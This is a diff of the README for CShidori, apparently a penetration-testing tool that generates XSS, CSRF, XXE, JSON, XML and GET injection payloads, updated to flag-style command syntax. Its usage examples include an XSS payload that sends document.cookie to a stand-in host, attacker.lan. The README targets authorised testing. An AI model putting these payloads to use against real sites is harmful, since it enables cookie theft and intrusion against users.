@@ -1,6 +1,6 @@
 # CShidori
 
-Web payloads generator
+A C# "Thousand Birds" Payloads Generator
 
 ## Disclaimer
 
@@ -9,96 +9,70 @@ Usage of all tools on this site for attacking targets without prior mutual conse
 ## References
 
 OWASP Web Application Security Testing Guide: [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
+Taisen: [Website](https://taisen.fr)
 
-## Payloads generation
+## supported modes/payloads
 
-- Fuzzing list
+- Mutation
 - XSS
 - JSON
 - XML
 - GET
 - CSRF
 - XXE
-- Mutation
 - Encoding
 
-## Exemples
-
-### Combine a wordlist with Chidori to test a specific parameter:
-
-```powershell
-gc wordlist.txt |%{ .\CShidori.exe xss "$_" }
-gc wordlist.txt |%{ .\CShidori.exe mut 5 "$_" }
-```
-
-### Generate get/post requests to tests
-
-```powershell
-.\CShidori.exe bc |%{ .\CShidori.exe get "?bar=foo&foo=bar" $_ }
-.\CShidori.exe bc |%{ .\CShidori.exe json request.json $_ }
-.\CShidori.exe bc |%{ .\CShidori.exe xml request.xml $_ }  
-```
-
-### Then send generated payloads with your usual tool
-
-exemple with Ffuf through Burp
-```powershell
-.\CShidori.exe bc > list ; .\ffuf.exe -u https://target/FUZZ -w list:FUZZ -replay-proxy http://127.0.0.1:8080
-```
-
 ## Usage
+
+### Mutation
+
+```powershell
+.\CShidori.exe -m mut -p 5 -i test
+```
 
 ### XSS / Injections
 
 ```powershell
-.\CShidori.exe xss 'document.location=\"https://attacker.lan?c=\"+document.cookie'
+.\CShidori.exe -m xss -i 'document.location=\"https://attacker.lan?c=\"+document.cookie'
 ```
 
 ### JSON
 
 ```powershell
-.\CShidori.exe json ..\testing\test.json "'"
+.\CShidori.exe -m json -p ..\testing\test.json -i "'"
 ```
 
 ### XML
 
 ```powershell
-.\CShidori.exe xml ..\testing\exemple.xml "'"
+.\CShidori.exe -m xml -p ..\testing\exemple.xml -i "'"
 ```
 
 ### GET
 
 ```powershell
-.\CShidori.exe get "?bar=foo&foo=bar" "'"
+.\CShidori.exe -m get -p "?bar=foo&foo=bar" -i "'"
 ```
 
 ### CSRF
 
 ```powershell
-.\CShidori.exe csrf post http://target.lan "name1=value1&name2=value2"
-.\CShidori.exe csrf get http://target.lan "name1=value1&name2=value2"
+.\CShidori.exe -m csrf -o get -p http://target.lan -i "name1=value1&name2=value2"
+.\CShidori.exe -m csrf -o post -p http://target.lan -i "name1=value1&name2=value2"
 ```
 
 ### XXE
 
 ```powershell
-.\CShidori.exe xxe file
-.\CShidori.exe xxe call 
-.\CShidori.exe xxe all
+.\CShidori.exe -m xxe -o file
+.\CShidori.exe -m xxe -o call 
+.\CShidori.exe -m xxe -o all 
 ```
-
-### Mutation
-
-```powershell
-.\CShidori.exe mut 5 test
-```
-
 ### Encode
 
 ```powershell
-.\CShidori.exe enc "<script>alert(1)</script>"
+.\CShidori.exe -m enc -p "<script>alert(1)</script>"
 ```
-
 
 ## Miscellaneous
 
@@ -113,6 +87,6 @@ Get-SpringArtefact -source .\project\repository -output .
 
 ### SOAP & XSD
 
-Removed since you can perform it with Visual Studio:
+Removed since you can perform it from Visual Studio:
 - Merge XSD in WSDL
 - Right click on the project and select "Add Service Reference" -> "WCF" -> "enter localPath"
